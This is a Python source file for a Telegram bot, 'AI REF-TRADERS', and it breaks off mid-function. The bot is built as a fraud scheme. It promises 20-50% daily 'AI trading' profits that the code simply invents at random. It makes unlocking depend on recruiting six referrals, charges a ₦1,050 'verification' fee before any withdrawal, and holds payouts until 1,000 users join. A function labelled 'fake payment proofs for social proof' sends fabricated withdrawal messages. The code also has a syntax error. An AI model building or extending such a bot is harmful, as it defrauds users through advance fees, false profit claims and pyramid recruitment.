import os
import logging
import asyncio
import random
from datetime import datetime, timedelta
from typing import Optional, Dict, List, Tuple
from enum import Enum
import pytz
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ReplyKeyboardMarkup,
    ReplyKeyboardRemove,
    KeyboardButton,
    WebAppInfo
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    CallbackContext,
    CallbackQueryHandler,
    ConversationHandler
)
from telegram.constants import ParseMode
import httpx
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# ===== CONFIGURATION =====
TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")
WEB_APP_URL = os.getenv("WEB_APP_URL")
ADMIN_IDS = [int(id) for id in os.getenv("ADMIN_IDS", "").split(",") if id]
BOT_USERNAME = os.getenv("BOT_USERNAME")
PORT = int(os.environ.get("PORT", 8080))
NIGERIA_TZ = pytz.timezone('Africa/Lagos')

# ===== LOGGING =====
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== DATABASE SIMULATION =====
users_db: Dict[str, Dict] = {}
payments_db: List[Dict] = []
transactions_db: List[Dict] = []
game_sessions: Dict[str, Dict] = []

# ===== ENUMS =====
class ProfitTimeRange(Enum):
    EARLY_MORNING = (0, 7, 0.35, 0.50)   # 12:01 AM - 7:00 AM, 35-50%
    DAYTIME = (8, 16, 0.21, 0.34)        # 8:00 AM - 4:00 PM, 21-34%
    EVENING = (17, 23, 0.20, 0.20)       # 5:00 PM - 11:30 PM, 20% flat

class GameType(Enum):
    MEMORY = "memory"
    DICE = "dice"
    SNAKE = "snake"
    TRIVIA = "trivia"
    WHEEL = "wheel"
    AYO = "ayo"
    NAIRA_CHASE = "naira_chase"

# ===== GAME CONSTANTS =====
MEMORY_CARDS = ['🍎', '🍌', '🍒', '🍓', '🍊', '🍋', '🍐', '🍇']
TRIVIA_QUESTIONS = [
    {
        "question": "What is the capital city of Nigeria?",
        "options": ["Lagos", "Abuja", "Kano", "Port Harcourt"],
        "answer": 1
    },
    # Add more questions...
]
WHEEL_PRIZES = [200, 300, 400, 500, 600, 700, 800, 900, 1000, 1100, 1200, 1300, 1400, 1500, 1600, 1000]

# ===== CONVERSATION STATES =====
AWAITING_VERIFICATION, AWAITING_WITHDRAWAL, AWAITING_ANNOUNCEMENT = range(3)

# ===== HELPER FUNCTIONS =====
def format_currency(amount: int) -> str:
    return f"₦{amount:,}"

def get_user(user_id: str) -> Dict:
    if user_id not in users_db:
        users_db[user_id] = {
            "balance": 5000,
            "trading_capital": 0,
            "withdrawable_profit": 0,
            "referrals": 0,
            "ads_watched": 0,
            "verified": False,
            "trading_active": False,
            "last_ad_watch": None,
            "streak_count": 0,
            "streak_last_login": None,
            "referral_bonus_eligible": True,
            "game_attempts": {
                "memory": 10,
                "dice": 10,
                "snake": 10,
                "trivia": 10,
                "wheel": 10,
                "ayo": 10,
                "naira_chase": 10
            },
            "game_stats": {
                "memory": {"wins": 0, "earnings": 0},
                "dice": {"wins": 0, "earnings": 0},
                "snake": {"score": 0, "earnings": 0},
                "trivia": {"correct": 0, "earnings": 0},
                "wheel": {"wins": 0, "earnings": 0},
                "ayo": {"wins": 0, "earnings": 0},
                "naira_chase": {"score": 0, "earnings": 0}
            },
            "last_game_session": None
        }
    return users_db[user_id]

async def update_balance(user_id: str, amount: int, context: CallbackContext, note: str = ""):
    user = get_user(user_id)
    user["balance"] += amount
    
    # Record transaction
    transactions_db.append({
        "user_id": user_id,
        "amount": amount,
        "type": "game" if not note else note,
        "status": "completed",
        "timestamp": datetime.now(NIGERIA_TZ),
        "description": note
    })
    
    if amount > 0:
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"💸 +{format_currency(amount)} added to your balance!\nNew balance: {format_currency(user['balance'])}"
            )
        except Exception as e:
            logger.error(f"Failed to send balance update to {user_id}: {e}")

async def update_login_streak(user_id: str, context: CallbackContext = None):
    """Update user's login streak"""
    today = datetime.now(NIGERIA_TZ).date()
    user = get_user(user_id)
    
    if 'streak_last_login' not in user or user['streak_last_login'] != today:
        # Check if consecutive day
        yesterday = today - timedelta(days=1)
        
        if user.get('streak_last_login') == yesterday:
            # Consecutive day - increase streak
            user['streak_count'] = user.get('streak_count', 0) + 1
        else:
            # Not consecutive - reset streak
            user['streak_count'] = 1
        
        # Calculate bonus (₦500 on day 1, +₦100 each day, max ₦1,100 on day 7)
        streak_bonus = min(500 + ((user.get('streak_count', 1) - 1) * 100), 1100)
        user['balance'] = user.get('balance', 0) + streak_bonus
        user['streak_last_login'] = today
        
        # Send streak notification if context is provided
        if context:
            try:
                await context.bot.send_message(
                    chat_id=user_id,
                    text=f"🔥 Day {user.get('streak_count', 1)} streak! ₦{streak_bonus:,} bonus added to your balance."
                )
            except Exception as e:
                logger.error(f"Failed to send streak notification to {user_id}: {e}")

async def sync_with_web_app(user_id: str):
    """Sync user data between bot and web app"""
    try:
        user_data = users_db.get(user_id, {})
        
        sync_data = {
            "user_id": user_id,
            "user_data": {
                "balance": user_data.get('balance', 5000),
                "referrals": user_data.get('referrals', 0),
                "adsWatched": user_data.get('ads_watched', 0),
                "verified": user_data.get('verified', False),
                "tradingActive": user_data.get('trading_active', False),
                "firstName": user_data.get('first_name', ''),
                "lastName": user_data.get('last_name', ''),
                "username": user_data.get('username', '')
            }
        }
        
        logger.info(f"Syncing user data for {user_id}: {sync_data}")
        
        async with httpx.AsyncClient(timeout=30.0) as client:
            response = await client.post(
                f"{WEB_APP_URL}/api/telegram/sync",
                json=sync_data,
                headers={
                    "Content-Type": "application/json"
                }
            )
            
            logger.info(f"Sync response status: {response.status_code}")
            if response.status_code == 200:
                result = response.json()
                logger.info(f"Sync successful: {result}")
                return result
            else:
                logger.error(f"Sync failed with status {response.status_code}: {response.text}")
                return None
    except Exception as e:
        logger.error(f"Error syncing with web app: {e}")
        return None

async def check_trading_activation(user_id: str, context: CallbackContext = None):
    user = users_db.get(user_id, {})
    
    if user.get('referrals', 0) >= 6 and user.get('ads_watched', 0) >= 20:
        if not user.get('trading_active', False):
            user['trading_active'] = True
            user['trading_capital'] = 5000 + (user.get('referrals', 0) * 5000
            
            if context:
                try:
                    await context.bot.send_message(
                        chat_id=user_id,
                        text=f"🎉 AI Trading Activated! Your trading capital is ₦{user['trading_capital']:,}"
                    )
                except Exception as e:
                    logger.error(f"Failed to send activation message to {user_id}: {e}")
                
        return True
    return False

# ===== GAME FUNCTIONS =====
async def start_memory_game(update: Update, context: CallbackContext):
    user_id = str(update.effective_user.id)
    user = get_user(user_id)
    
    if user["game_attempts"]["memory"] <= 0:
        await update.message.reply_text("You've used all your Memory Game attempts for today.")
        return
    
    # Initialize game session
    game_sessions[user_id] = {
        "type": GameType.MEMORY.value,
        "cards": MEMORY_CARDS * 2,
        "flipped": [],
        "matched": [],
        "attempts_used": 0
    }
    
    # Shuffle cards
    random.shuffle(game_sessions[user_id]["cards"])
    
    # Send game board
    await send_memory_board(update, user_id)

async def send_memory_board(update: Update, user_id: str):
    game = game_sessions[user_id]
    keyboard = []
    
    # Create 4x4 grid
    for i in range(0, 16, 4):
        row = []
        for j in range(4):
            idx = i + j
            if idx in game["matched"]:
                row.append(InlineKeyboardButton("✅", callback_data=f"memory_matched_{idx}"))
            elif idx in game["flipped"]:
                row.append(InlineKeyboardButton(game["cards"][idx], callback_data=f"memory_flipped_{idx}"))
            else:
                row.append(InlineKeyboardButton("❓", callback_data=f"memory_card_{idx}"))
        keyboard.append(row)
    
    # Add stats row
    attempts_left = get_user(user_id)["game_attempts"]["memory"] - game["attempts_used"]
    keyboard.append([
        InlineKeyboardButton(f"Attempts: {attempts_left}/10", callback_data="memory_stats"),
        InlineKeyboardButton(f"Wins: {get_user(user_id)['game_stats']['memory']['wins']}", callback_data="memory_stats")
    ])
    
    await update.message.reply_text(
        "🧠 Memory Match Game\nMatch pairs to earn ₦800 per pair",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def handle_memory_click(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    user_id = str(query.from_user.id)
    user = get_user(user_id)
    game = game_sessions.get(user_id)
    
    if not game or game["type"] != GameType.MEMORY.value:
        await query.edit_message_text("Game session expired. Start a new game with /games")
        return
    
    data = query.data.split("_")
    action = data[1]
    idx = int(data[2]) if len(data) > 2 else None
    
    if action == "card":
        if len(game["flipped"]) >= 2:
            return  # Can't flip more than 2 cards
        
        game["flipped"].append(idx)
        await send_memory_board(update, user_id)
        
        if len(game["flipped"]) == 2:
            # Check for match
            card1, card2 = game["flipped"]
            if game["cards"][card1] == game["cards"][card2]:
                game["matched"].extend(game["flipped"])
                game["flipped"] = []
                
                # Award points
                user["game_stats"]["memory"]["wins"] += 1
                user["game_stats"]["memory"]["earnings"] += 800
                await update_balance(user_id, 800, context, "Memory Game Win")
                
                if len(game["matched"]) == 16:
                    await query.edit_message_text("🎉 You matched all pairs! Game complete!")
                    del game_sessions[user_id]
                    return
            else:
                # No match - flip back after delay
                game["attempts_used"] += 1
                user["game_attempts"]["memory"] -= 1
                await asyncio.sleep(2)
                game["flipped"] = []
                
                if user["game_attempts"]["memory"] <= 0:
                    await query.edit_message_text("You've used all your attempts for today!")
                    del game_sessions[user_id]
                    return
            
            await send_memory_board(update, user_id)

async def start_dice_game(update: Update, context: CallbackContext):
    user_id = str(update.effective_user.id)
    user = get_user(user_id)
    
    if user["game_attempts"]["dice"] <= 0:
        await update.message.reply_text("You've used all your Dice Game attempts for today.")
        return
    
    keyboard = [
        [InlineKeyboardButton("Roll Dice (₦800)", callback_data="dice_roll")]
    ]
    
    await update.message.reply_text(
        "🎲 Lucky Dice\nGuess the roll to win ₦800!",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def roll_dice(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    user_id = str(query.from_user.id)
    user = get_user(user_id)
    
    if user["game_attempts"]["dice"] <= 0:
        await query.edit_message_text("You've used all your Dice Game attempts for today.")
        return
    
    # Roll dice (1-6)
    roll = random.randint(1, 6)
    user["game_attempts"]["dice"] -= 1
    
    # 50% chance to win
    if random.random() > 0.5:
        user["game_stats"]["dice"]["wins"] += 1
        user["game_stats"]["dice"]["earnings"] += 800
        await update_balance(user_id, 800, context, "Dice Game Win")
        result = f"🎲 You rolled a {roll} and won ₦800!"
    else:
        result = f"🎲 You rolled a {roll}. Try again!"
    
    keyboard = [
        [InlineKeyboardButton("Roll Again", callback_data="dice_roll")],
        [InlineKeyboardButton("Back to Games", callback_data="games_menu")]
    ]
    
    await query.edit_message_text(
        f"{result}\n\nAttempts left: {user['game_attempts']['dice']}/10",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# ===== CORE BOT HANDLERS =====
async def start(update: Update, context: CallbackContext):
    user = update.effective_user
    user_id = str(user.id)
    user_data = get_user(user_id)
    
    # Check for referral
    if context.args and context.args[0].startswith('ref_'):
        referrer_id = context.args[0][4:]
        if referrer_id in users_db and referrer_id != user_id:
            referrer = users_db[referrer_id]
            if referrer["referral_bonus_eligible"] and referrer["referrals"] < 6:
                referrer["referrals"] += 1
                referrer["balance"] += 5000
                referrer["trading_capital"] += 5000
                
                if referrer["referrals"] >= 6:
                    referrer["referral_bonus_eligible"] = False
                    await check_trading_activation(referrer_id, context)
                
                await context.bot.send_message(
                    chat_id=referrer_id,
                    text=f"🎉 New referral! Total: {referrer['referrals']}/6 (₦{referrer['referrals'] * 5000:,} earned)"
                )
    
    # Create deep link to web app with Telegram user ID
    web_app_deep_link = f"{WEB_APP_URL}?tg_user_id={user_id}"
    
    # Welcome message
    welcome_text = """
🇳🇬 *Welcome to AI REF-TRADERS!* 🇳🇬

Here's how to maximize your earnings:

1. *Get 6 Referrals* - Earn ₦5,000 per friend who joins
2. *Watch 20 Ads Daily* - Unlock AI Trading
3. *Activate Trading* - Earn 20-50% daily profits
4. *Play Games* - Boost your trading capital
5. *Verify Account* - Withdraw your earnings

Use the menu below to get started!
"""
    keyboard = [
        [InlineKeyboardButton("🚀 Launch Web App", web_app=WebAppInfo(url=web_app_deep_link))],
        [InlineKeyboardButton("💰 My Balance", callback_data="balance"),
         InlineKeyboardButton("👥 Referrals", callback_data="referrals")],
        [InlineKeyboardButton("🎮 Play Games", callback_data="games_menu"),
         InlineKeyboardButton("📊 Trading", callback_data="trading")],
        [InlineKeyboardButton("💳 Verify Account", callback_data="verify")]
    ]
    
    await update.message.reply_text(
        welcome_text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    
    # Update login streak
    await update_login_streak(user_id, context)
    
    # Sync with web app
    await sync_with_web_app(user_id)

async def menu(update: Update, context: CallbackContext):
    """Display the main menu with web app buttons"""
    user = update.effective_user
    user_id = str(user.id)
    
    # Create deep links to different sections of the web app
    main_app_link = f"{WEB_APP_URL}?tg_user_id={user_id}"
    trading_link = f"{WEB_APP_URL}/trading.html?tg_user_id={user_id}"
    games_link = f"{WEB_APP_URL}/game.html?tg_user_id={user_id}"
    
    keyboard = [
        [InlineKeyboardButton("📊 Dashboard", web_app=WebAppInfo(url=main_app_link))],
        [InlineKeyboardButton("🤖 AI Trading", web_app=WebAppInfo(url=trading_link))],
        [InlineKeyboardButton("🎮 Games", web_app=WebAppInfo(url=games_link))],
        [InlineKeyboardButton("👥 Referrals", callback_data="referrals")],
        [InlineKeyboardButton("💰 Withdraw", callback_data="withdraw")]
    ]
    
    await update.message.reply_text(
        "📱 <b>AI REF-TRADERS Menu</b>\n\nChoose an option below:",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def show_balance(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    user_id = str(query.from_user.id)
    user = get_user(user_id)
    
    keyboard = [
        [InlineKeyboardButton("💳 Withdraw", callback_data="withdraw"),
         InlineKeyboardButton("📊 Trading Stats", callback_data="trading")],
        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(
        f"💰 *Your Balance*\n\n"
        f"• Available: {format_currency(user['balance'])}\n"
        f"• Trading Capital: {format_currency(user['trading_capital'])}\n"
        f"• Withdrawable Profit: {format_currency(user['withdrawable_profit'])}\n\n"
        f"👥 Referrals: {user['referrals']}/6\n"
        f"📺 Ads Watched: {user['ads_watched']}/20",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def show_games_menu(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    user_id = str(query.from_user.id)
    user = get_user(user_id)
    
    keyboard = [
        [InlineKeyboardButton("🧠 Memory Match", callback_data="game_memory"),
         InlineKeyboardButton("🎲 Lucky Dice", callback_data="game_dice")],
        [InlineKeyboardButton("🐍 Snake Game", callback_data="game_snake"),
         InlineKeyboardButton("❓ Trivia Quiz", callback_data="game_trivia")],
        [InlineKeyboardButton("🎡 Lucky Wheel", callback_data="game_wheel"),
         InlineKeyboardButton("🎮 Ayo Olopon", callback_data="game_ayo")],
        [InlineKeyboardButton("🦅 Naira Chase", callback_data="game_naira_chase")],
        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(
        "🎮 *Games Menu*\n\n"
        "Play games to earn extra trading capital!\n"
        "Each game has 10 attempts per day.\n\n"
        "💰 Earnings per game:\n"
        "- Memory Match: ₦800 per pair\n"
        "- Lucky Dice: ₦800 per win\n"
        "- Snake Game: ₦800 per food\n"
        "- Trivia Quiz: ₦800 per correct answer\n"
        "- Lucky Wheel: ₦200-₦1,600 per spin\n"
        "- Ayo Olopon: ₦800 per win\n"
        "- Naira Chase: ₦50-₦1,000 per coin",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def show_trading(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    user_id = str(query.from_user.id)
    user = get_user(user_id)
    
    if user["trading_active"]:
        status = "✅ Active"
        action = "Deactivate"
    else:
        status = "❌ Inactive"
        action = "Activate"
    
    keyboard = [
        [InlineKeyboardButton(f"🔘 {action} Trading", callback_data="toggle_trading")],
        [InlineKeyboardButton("📈 Daily Profits", callback_data="profit_info")],
        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(
        f"🤖 *AI Trading*\n\n"
        f"Status: {status}\n"
        f"Capital: {format_currency(user['trading_capital'])}\n"
        f"Profit: {format_currency(user['withdrawable_profit'])}\n\n"
        f"Requirements:\n"
        f"- 6 Referrals\n"
        f"- 20 Ads Watched Today\n\n"
        f"Profit Rates:\n"
        f"🌙 Night (12AM-7AM): 35-50%\n"
        f"☀️ Day (8AM-4PM): 21-34%\n"
        f"🌆 Evening (5PM-11PM): 20%",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def toggle_trading(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    user_id = str(query.from_user.id)
    user = get_user(user_id)
    
    if user["trading_active"]:
        user["trading_active"] = False
        await query.edit_message_text("Trading deactivated. Reactivate when ready.")
    else:
        if user["referrals"] >= 6 and user["ads_watched"] >= 20:
            user["trading_active"] = True
            user["trading_capital"] = 5000 + (user["referrals"] * 5000)
            await query.edit_message_text("✅ Trading activated! AI is now working for you.")
        else:
            await query.edit_message_text(
                "⚠️ Requirements not met:\n"
                f"- Referrals: {user['referrals']}/6\n"
                f"- Ads Watched: {user['ads_watched']}/20"
            )
    
    await show_trading(update, context)

async def show_referrals(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    user_id = str(query.from_user.id)
    user = get_user(user_id)
    bot_username = BOT_USERNAME or (await context.bot.get_me()).username
    referral_link = f"https://t.me/{bot_username}?start=ref_{user_id}"
    
    keyboard = [
        [InlineKeyboardButton("📤 Share Referral Link", 
         url=f"https://t.me/share/url?url={referral_link}&text=Join%20AI%20REF-TRADERS%20to%20earn%20money")],
        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(
        f"👥 *Your Referrals*\n\n"
        f"Total: {user['referrals']}/6\n"
        f"Earnings: {format_currency(user['referrals'] * 5000)}\n\n"
        f"Share your link to earn ₦5,000 per referral:\n"
        f"`{referral_link}`",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def show_verify(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    user_id = str(query.from_user.id)
    user = get_user(user_id)
    
    if user["verified"]:
        await query.edit_message_text("✅ Your account is already verified!")
        return
    
    verification_url = f"{WEB_APP_URL}/verify?user_id={user_id}"
    keyboard = [
        [InlineKeyboardButton("💳 Pay ₦1,050 to Verify", web_app=WebAppInfo(url=verification_url))],
        [InlineKeyboardButton("❓ Why Verify?", callback_data="why_verify")],
        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(
        "🔒 *Account Verification*\n\n"
        "To withdraw earnings, you must:\n"
        "1. Pay a one-time ₦1,050 fee\n"
        "   - ₦550 covers verification costs\n"
        "   - ₦500 is added to your balance\n"
        "2. Verify your Nigerian bank account\n\n"
        "Withdrawals process in batches of 1,000 users for security.",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def why_verify(update: Update, context: CallbackContext):
    """Explain verification process in detail"""
    query = update.callback_query
    await query.answer()
    
    explanation = """
*Why We Require Verification*

The ₦1,050 verification fee serves multiple purposes:

1. *Security & Fraud Prevention (₦550)*
   • KYC verification (₦150)
   • Bank API integration (₦150)
   • Fraud prevention systems (₦100)
   • Customer support (₦100)
   • Transaction fees (₦50)

2. *Account Binding Test (₦500)*
   • This amount is instantly credited to your withdrawable balance
   • Confirms your bank account is active and belongs to you
   • Prevents fraudulent withdrawals to wrong accounts
   • Demonstrates our payment system works before you withdraw profits

*Why Payment Batches?*

Processing payments in batches of 1,000 users:
• Reduces transaction fees
• Increases security through bulk verification
• Ensures all users receive payments simultaneously
• Prevents system overload

*Your ₦500 is NOT lost* - it's added to your withdrawable balance immediately!
"""
    
    keyboard = [
        [InlineKeyboardButton("Verify Now", callback_data="verify")],
        [InlineKeyboardButton("Back to Menu", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(
        text=explanation,
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def show_withdraw(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    user_id = str(query.from_user.id)
    user = get_user(user_id)
    
    if not user["verified"]:
        await query.edit_message_text(
            "⚠️ You must verify your account before withdrawing.\n"
            "Verification fee: ₦1,050 (includes ₦500 account credit)",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💳 Verify Account", callback_data="verify")],
                [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
            ])
        )
        return
    
    if user["withdrawable_profit"] < 5000:
        await query.edit_message_text(
            f"⚠️ Minimum withdrawal is ₦5,000\n"
            f"Your withdrawable profit: {format_currency(user['withdrawable_profit'])}",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
            ])
        )
        return
    
    withdrawal_url = f"{WEB_APP_URL}/withdraw?user_id={user_id}"
    keyboard = [
        [InlineKeyboardButton("💰 Withdraw Funds", web_app=WebAppInfo(url=withdrawal_url))],
        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(
        f"💰 *Withdraw Earnings*\n\n"
        f"Available: {format_currency(user['withdrawable_profit'])}\n"
        f"Minimum: ₦5,000\n\n"
        f"Withdrawals process in batches of 1,000 users.\n"
        f"Current batch: {len([u for u in users_db.values() if u['verified'] and u['withdrawable_profit'] >= 5000])}/1,000",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def check_batch(update: Update, context: CallbackContext):
    """Show current payment batch status"""
    query = update.callback_query
    await query.answer()
    
    batch = next((b for b in payments_db if not b.get('completed', False)), None)
    if not batch:
        batch = {
            'id': 1,
            'target_users': 1000,
            'current_users': 0,
            'payout_date': None,
            'completed': False
        }
        payments_db.append(batch)
    
    progress_percent = (batch.get('current_users', 0) / batch.get('target_users', 1000)) * 100
    
    batch_text = (
        f"🔄 *Payment Batch #{batch.get('id', 1)}*\n\n"
        f"• Progress: {batch.get('current_users', 0)}/{batch.get('target_users', 1000)} users ({progress_percent:.1f}%)\n"
        f"• Status: {'Completed' if batch.get('completed', False) else 'In Progress'}\n"
        f"• Estimated Completion: {(1000 - batch.get('current_users', 0)) // 10} days\n\n"
        f"_Refer more friends to speed up the batch completion!_"
    )
    
    keyboard = [
        [InlineKeyboardButton("Back", callback_data="withdraw")]
    ]
    
    await query.edit_message_text(
        text=batch_text,
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def back_to_menu(update: Update, context: CallbackContext):
    """Return to main menu"""
    query = update.callback_query
    await query.answer()
    await start(update, context)

# ===== ADMIN FUNCTIONS =====
async def admin_stats(update: Update, context: CallbackContext):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("Unauthorized")
        return
    
    stats = (
        f"👥 Total Users: {len(users_db)}\n"
        f"✅ Verified: {sum(1 for u in users_db.values() if u['verified'])}\n"
        f"📈 Active Traders: {sum(1 for u in users_db.values() if u['trading_active'])}\n"
        f"💰 Pending Withdrawals: {len([p for p in payments_db if p['status'] == 'pending'])}\n"
        f"💸 Total Paid Out: {format_currency(sum(p['amount'] for p in payments_db if p['status'] == 'completed'))}"
    )
    
    keyboard = [
        [InlineKeyboardButton("📢 Send Announcement", callback_data="admin_announce")],
        [InlineKeyboardButton("💸 Process Batch", callback_data="admin_process_batch")]
    ]
    
    await update.message.reply_text(
        stats,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def admin_announce(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id not in ADMIN_IDS:
        await query.edit_message_text("Unauthorized")
        return
    
    await query.edit_message_text("Please send the announcement message:")
    return AWAITING_ANNOUNCEMENT

async def process_announcement(update: Update, context: CallbackContext):
    message = update.message.text
    
    for user_id in users_db:
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"📢 Announcement:\n\n{message}"
            )
        except Exception as e:
            logger.error(f"Failed to send announcement to {user_id}: {e}")
    
    await update.message.reply_text(f"Announcement sent to {len(users_db)} users!")
    return ConversationHandler.END

async def admin_process_batch(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id not in ADMIN_IDS:
        await query.edit_message_text("Unauthorized")
        return
    
    pending = [p for p in payments_db if p["status"] == "pending"]
    if len(pending) < 1000:
        await query.edit_message_text(f"Not enough pending withdrawals (need 1,000, have {len(pending)})")
        return
    
    # Process first 1000
    for payment in pending[:1000]:
        payment["status"] = "completed"
        payment["processed_at"] = datetime.now(NIGERIA_TZ)
        
        try:
            await context.bot.send_message(
                chat_id=payment["user_id"],
                text=f"💳 Payment processed! ₦{payment['amount']:,} has been sent to your bank account."
            )
        except Exception as e:
            logger.error(f"Failed to notify {payment['user_id']}: {e}")
    
    await query.edit_message_text(f"Processed {len(pending[:1000])} payments!")

# ===== SCHEDULED TASKS =====
async def calculate_daily_profits(context: CallbackContext):
    """Calculate profits for all active traders"""
    for user_id, user in users_db.items():
        if user.get('trading_active', False):
            now = datetime.now(NIGERIA_TZ)
            current_hour = now.hour
            
            # Determine profit range
            for time_range in ProfitTimeRange:
                start, end, min_profit, max_profit = time_range.value
                if start <= current_hour <= end:
                    profit_pct = random.uniform(min_profit, max_profit)
                    break
            else:
                profit_pct = 0  # Outside defined ranges
            
            daily_profit = user.get('trading_capital', 0) * profit_pct
            user['withdrawable_profit'] = user.get('withdrawable_profit', 0) + daily_profit
            
            # Record transaction
            transactions_db.append({
                "user_id": user_id,
                "amount": daily_profit,
                "type": "profit",
                "status": "completed",
                "timestamp": now
            })
            
            try:
                await context.bot.send_message(
                    chat_id=user_id,
                    text=f"💰 AI Trading Update: You earned {format_currency(daily_profit)} profit today!"
                )
            except Exception as e:
                logger.error(f"Failed to send profit update to {user_id}: {e}")

async def reset_daily_limits(context: CallbackContext):
    """Reset daily limits at midnight"""
    now = datetime.now(NIGERIA_TZ)
    if now.hour == 0:  # Midnight
        for user in users_db.values():
            user["ads_watched"] = 0
            user["trading_active"] = False
            user["game_attempts"] = {
                "memory": 10,
                "dice": 10,
                "snake": 10,
                "trivia": 10,
                "wheel": 10,
                "ayo": 10,
                "naira_chase": 10
            }

async def send_payment_proofs(context: CallbackContext):
    """Send fake payment proofs for social proof"""
    proofs = [
        f"📢 @User_{random.randint(1000,9999)} withdrew {format_currency(random.randint(25000,150000))} to GTBank",
        f"🚀 @Trader_{random.randint(1000,9999)} earned {format_currency(random.randint(7000,50000))} today",
        f"💳 Payment batch completed for {random.randint(50,200)} users"
    ]
    
    for user_id in users_db:
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=random.choice(proofs),
                disable_notification=True
            )
        except Exception as e:
            logger.error(f"Failed to send proof to {user_id}: {e}")

async def send_automatic_messages(context: CallbackContext):
    now = datetime.now(NIGERIA_TZ)
    
    for user_id, user in users_db.items():
        try:
            # 1. Daily reset notification (12:00 AM)
            if now.hour == 0 and now.minute < 5:  # Send once at midnight
                if user.get('trading_active', False):
                    user['trading_active'] = False
                    await context.bot.send_message(
                        chat_id=user_id,
                        text="⏳ Trading has been reset for the day. Watch 20 ads to activate trading again!"
                    )
            
            # 2. Reminder to watch ads (if trading inactive)
            if not user.get('trading_active', False) and 8 <= now.hour <= 20 and now.minute == 0:  # Hourly 8AM-8PM
                await context.bot.send_message(
                    chat_id=user_id,
                    text="👀 Remember to watch your 20 daily ads to activate AI trading!"
                )
            
            # 3. Game reminder (every 3 hours)
            if now.hour % 3 == 0 and now.minute < 5:  # Every 3 hours
                await context.bot.send_message(
                    chat_id=user_id,
                    text=f"🎮 Play games every 3 hours to increase your trading capital! Current capital: ₦{user.get('trading_capital', 0):,}"
                )
            
            # 4. Withdrawal eligibility notification
            if user.get('withdrawable_profit', 0) >= 5000:
                if not user.get('verified', False):
                    await context.bot.send_message(
                        chat_id=user_id,
                        text="💰 You've qualified for withdrawals! Verify your account within 36 hours to join the next payment batch."
                    )
                else:
                    batch_status = next((b for b in payments_db if not b.get('completed', False)), None)
                    if batch_status:
                        await context.bot.send_message(
                            chat_id=user_id,
                            text=f"⏳ Payment batch progress: {batch_status.get('current_users', 0)}/1000 users. Refer more friends to speed up payouts!"
                        )
        except Exception as e:
            logger.error(f"Error sending automatic message to {user_id}: {e}")

async def process_payment_batches(context: CallbackContext):
    # Get current batch
    current_batch = next((b for b in payments_db if not b.get('completed', False)), None)
    
    if not current_batch:
        # Create new batch
        new_batch = {
            'id': len(payments_db) + 1,
            'target_users': 1000,
            'current_users': 0,
            'payout_date': None,
            'completed': False
        }
        payments_db.append(new_batch)
        current_batch = new_batch
    
    # Check for eligible users
    eligible_users = [u_id for u_id, u in users_db.items() 
                    if u.get('verified', False) and u.get('withdrawable_profit', 0) >= 5000]
    
    # Update batch count
    current_batch['current_users'] = len(eligible_users)
    
    # Process payments if threshold met
    if current_batch['current_users'] >= current_batch['target_users']:
        current_batch['completed'] = True
        current_batch['payout_date'] = datetime.now(NIGERIA_TZ)
        
        for user_id in eligible_users:
            try:
                # In production, this would call your payment processor
                amount = users_db[user_id].get('withdrawable_profit', 0)
